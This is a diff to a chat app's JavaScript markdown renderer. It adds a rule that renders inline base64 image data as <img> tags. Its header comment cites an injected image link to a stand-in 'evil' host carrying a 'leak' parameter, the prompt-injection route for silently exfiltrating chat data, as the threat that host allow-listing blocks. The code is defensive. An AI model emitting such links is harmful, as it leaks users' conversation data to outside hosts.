@@ -16,6 +16,8 @@
  * Image tags are only produced for trusted hosts — anything else
  * becomes a plain link — so injected "![](https://evil/?leak=...)"
  * can't fire a silent tracking request when a message renders.
+ * The one exception that needs no host: a base64 data:image/jpeg|png|webp
+ * address (a picture stored in the chat itself) — it cannot reach anywhere.
  * ==========================================================
  */
 
@@ -254,6 +256,11 @@ export function renderInline(text) {
 
         return `\u0002${codes.length - 1}\u0002`;
     });
+
+    // pictures kept inside the chat (made by Gemini, js/imageGen.js): only real base64 image data
+    out = out.replace(/!\[([^\]]*)\]\((data:image\/(?:jpeg|png|webp);base64,[A-Za-z0-9+/=]+)\)/g, (match, alt, url) =>
+        hold(`<img src="${url}" alt="${alt}" decoding="async" class="message-image">`)
+    );
 
     // images — only trusted hosts render as <img>
     out = out.replace(/!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/g, (match, alt, url) =>
